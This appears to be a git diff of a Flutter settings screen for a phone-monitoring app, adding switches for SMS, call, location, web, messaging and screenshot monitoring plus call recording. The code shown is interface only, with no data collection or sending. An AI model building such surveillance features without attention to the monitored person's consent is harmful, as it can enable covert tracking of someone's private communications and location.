@@ -7,11 +7,90 @@ import 'remote_commands_screen.dart';
 import 'stats_screen.dart';
 import '../theme/theme.dart';
 
-class SettingsScreen extends StatelessWidget {
+class SettingsController extends ChangeNotifier {
+  Map<String, bool> _settings = {
+    'sms': false,
+    'mms': false,
+    'call': false,
+    'callRecording': false,
+    'location': false,
+    'apps': false,
+    'sites': false,
+    'contacts': false,
+    'screenshot': false,
+    'instantMessaging': false,
+  };
+
+  bool getSetting(String key) => _settings[key] ?? false;
+
+  void toggleSetting(String key) {
+    if (_settings.containsKey(key)) {
+      _settings[key] = !_settings[key]!;
+      notifyListeners();
+    }
+  }
+}
+
+class SettingsScreen extends StatefulWidget {
+  @override
+  _SettingsScreenState createState() => _SettingsScreenState();
+}
+
+class _SettingsScreenState extends State<SettingsScreen>
+    with TickerProviderStateMixin {
+  final SettingsController _controller = SettingsController();
+  late AnimationController _settingsAnimationController;
+
+  @override
+  void initState() {
+    super.initState();
+    _settingsAnimationController = AnimationController(
+      vsync: this,
+      duration: const Duration(milliseconds: 300),
+    );
+    _settingsAnimationController.forward();
+  }
+
+  @override
+  void dispose() {
+    _settingsAnimationController.dispose();
+    super.dispose();
+  }
+
+  Widget _buildSettingTile(String title, String subtitle, String settingKey) {
+    return AnimatedBuilder(
+      animation: _settingsAnimationController,
+      builder: (context, child) {
+        return FadeTransition(
+          opacity: _settingsAnimationController,
+          child: SwitchListTile(
+            title: Text(title, style: AppTheme.bodyStyle),
+            subtitle: Text(subtitle, style: AppTheme.captionStyle),
+            value: _controller.getSetting(settingKey),
+            onChanged: (bool value) {
+              setState(() {
+                _controller.toggleSetting(settingKey);
+              });
+            },
+            activeColor: AppTheme.primaryColor,
+          ),
+        );
+      },
+    );
+  }
+
   @override
   Widget build(BuildContext context) {
     return Scaffold(
       appBar: AppBar(
+        leading: IconButton(
+          icon: Icon(
+            Icons.arrow_back_ios_new_rounded,
+            color: AppTheme.surfaceColor,
+            size: 22,
+          ),
+          onPressed: () => Navigator.of(context).pop(),
+        ),
         title: Text('Settings', style: AppTheme.headlineStyle),
         backgroundColor: AppTheme.primaryColor,
         shape: AppTheme.appBarTheme.shape,
@@ -20,8 +99,68 @@ class SettingsScreen extends StatelessWidget {
         decoration: BoxDecoration(
           gradient: AppTheme.backgroundGradient,
         ),
-        child: Center(
-          child: Text('Settings Screen Content', style: AppTheme.titleStyle),
+        child: ListView(
+          padding: const EdgeInsets.all(16.0),
+          children: [
+            Card(
+              elevation: 4,
+              child: Column(
+                children: [
+                  ListTile(
+                    title: Text('Communication',
+                        style: AppTheme.subtitleStyle
+                            .copyWith(fontWeight: FontWeight.bold)),
+                  ),
+                  _buildSettingTile('SMS Monitoring',
+                      'Monitor incoming and outgoing SMS messages', 'sms'),
+                  _buildSettingTile(
+                      'MMS Monitoring', 'Monitor multimedia messages', 'mms'),
+                  _buildSettingTile('Call Monitoring',
+                      'Monitor incoming and outgoing calls', 'call'),
+                  _buildSettingTile(
+                      'Call Recording', 'Record phone calls', 'callRecording'),
+                ],
+              ),
+            ),
+            SizedBox(height: 16),
+            Card(
+              elevation: 4,
+              child: Column(
+                children: [
+                  ListTile(
+                    title: Text('Location & Activity',
+                        style: AppTheme.subtitleStyle
+                            .copyWith(fontWeight: FontWeight.bold)),
+                  ),
+                  _buildSettingTile(
+                      'Location Tracking', 'Track device location', 'location'),
+                  _buildSettingTile('App Monitoring',
+                      'Monitor app usage and activity', 'apps'),
+                  _buildSettingTile(
+                      'Web Monitoring', 'Monitor website visits', 'sites'),
+                ],
+              ),
+            ),
+            SizedBox(height: 16),
+            Card(
+              elevation: 4,
+              child: Column(
+                children: [
+                  ListTile(
+                    title: Text('Other Monitoring',
+                        style: AppTheme.subtitleStyle
+                            .copyWith(fontWeight: FontWeight.bold)),
+                  ),
+                  _buildSettingTile(
+                      'Contacts', 'Monitor contact list changes', 'contacts'),
+                  _buildSettingTile('Screenshot',
+                      'Capture periodic screenshots', 'screenshot'),
+                  _buildSettingTile('Instant Messaging',
+                      'Monitor messaging apps', 'instantMessaging'),
+                ],
+              ),
+            ),
+          ],
         ),
       ),
       bottomNavigationBar: CurvedNavigationBar(
